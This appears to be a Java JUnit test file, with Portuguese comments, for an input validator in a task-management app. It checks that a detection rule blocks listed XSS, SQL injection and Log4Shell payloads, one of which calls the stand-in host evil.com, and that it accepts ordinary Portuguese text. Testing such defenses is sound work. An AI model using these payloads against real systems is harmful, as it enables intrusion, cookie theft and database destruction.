package com.justdoit.common.validation;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Teste unitário da regra de detecção usada por {@link TextoSeguro}.
 *
 * Complementa os *MetricsTest dos serviços: aqui a regra é exercitada direto,
 * sem HTTP; lá ela é medida ponta a ponta como taxa de rejeição de requisição.
 */
class TextoSeguroValidatorTest {

    private final TextoSeguroValidator validator = new TextoSeguroValidator();

    private boolean aceita(String texto) {
        return validator.isValid(texto, null);
    }

    // ─────────────────────────────────────────────
    // Deve BLOQUEAR
    // ─────────────────────────────────────────────

    @ParameterizedTest
    @ValueSource(strings = {
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\"></iframe>",
            "<body onload=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(document.cookie)",
            "${jndi:ldap://evil.com/a}",
            "'; DROP TABLE task; --",
            "1' OR '1'='1",
            "admin'--",
            "UNION SELECT password FROM users"
    })
    @DisplayName("deve bloquear entrada maliciosa")
    void deveBloquearEntradaMaliciosa(String payload) {
        assertThat(aceita(payload))
                .as("payload deveria ter sido bloqueado: %s", payload)
                .isFalse();
    }

    // ─────────────────────────────────────────────
    // Deve ACEITAR (guarda contra falso positivo)
    // ─────────────────────────────────────────────

    @ParameterizedTest
    @ValueSource(strings = {
            "Revisar orçamento < 500 reais",
            "Estudar C++ & algoritmos",
            "Reunião com D'Ávila às 14h",
            "Tarefa 1 -- prioridade alta",
            "Preço: R$ 50,00 (20% off)",
            "Ler artigo sobre a/b testing",
            "Comparar: a < b e b > c",
            "E-mail do cliente: contato@empresa.com.br",
            "Descrição com \"aspas\" e 'apóstrofos'",
            "Rever cronograma — entrega dia 30/07"
    })
    @DisplayName("não deve bloquear texto legítimo em português")
    void naoDeveBloquearTextoLegitimo(String texto) {
        assertThat(aceita(texto))
                .as("texto legítimo foi bloqueado indevidamente: %s", texto)
                .isTrue();
    }

    // ─────────────────────────────────────────────
    // Casos de borda
    // ─────────────────────────────────────────────

    @Test
    @DisplayName("nulo e vazio passam: preenchimento é responsabilidade do @NotBlank")
    void nuloEVazioPassam() {
        assertThat(aceita(null)).isTrue();
        assertThat(aceita("")).isTrue();
        assertThat(aceita("   ")).isTrue();
    }
}
